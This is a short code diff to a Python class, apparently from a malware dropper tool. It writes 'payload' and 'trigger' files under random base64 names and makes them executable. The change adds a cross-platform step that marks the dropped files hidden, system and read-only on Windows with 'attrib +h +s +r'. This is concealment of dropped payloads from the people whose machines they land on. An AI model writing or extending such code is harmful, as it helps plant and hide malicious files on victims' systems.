@@ -31,6 +31,12 @@ class FileCreator:
     def get_file_name():
         return b64encode(str(uuid1()).encode('utf-8')).decode('utf-8')
 
+    def set_file_attributes(self, file_path):
+        if self.os == "Linux" or self.os == "Darwin":
+            system(f'chmod +x {file_path}')
+        elif self.os == "Windows":
+            system(f'attrib +h +s +r {file_path}')
+
     def create_payload_files(self, payload_code):
         payload_files = []
 
@@ -45,7 +51,7 @@ class FileCreator:
                 with open(file_path, "w+") as payload_write:
                     payload_write.write(payload_code)
 
-                system(f'chmod +x {file_path}')
+                self.set_file_attributes(file_path=file_path)
             except Exception as e:
                 continue
             else:
@@ -67,7 +73,8 @@ class FileCreator:
             try:
                 with open(file_path, "w+") as trigger_write:
                     trigger_write.write(trigger_code)
-                system(f'chmod +x {file_path}')
+                self.set_file_attributes(file_path=file_path)
+
             except Exception as e:
                 continue
             else:
